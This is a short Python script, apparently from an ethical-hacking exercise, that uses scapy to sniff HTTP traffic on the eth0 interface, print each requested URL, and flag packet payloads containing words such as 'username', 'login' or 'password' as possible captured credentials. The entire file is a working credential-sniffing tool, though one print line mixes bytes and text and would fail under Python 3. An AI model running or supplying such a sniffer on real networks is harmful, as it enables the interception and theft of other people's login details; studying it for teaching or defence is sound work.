#!/usr/bin/python3
#python3   -m pip install SomePackage 
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if(packet.haslayer(http.HTTPRequest)):
        #print(packet.show())
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTP Request >>" + url)
        if(packet.haslayer(scapy.Raw)):
            load = packet[scapy.Raw].load
            keywords = ["username","uname","login","password","pass","user"]
            for keyword in keywords:
                if keyword in str(load):
                    print("\n\n[+] Possible username/password >" + load + "\n\n")
                    break

sniff("eth0")   # your interface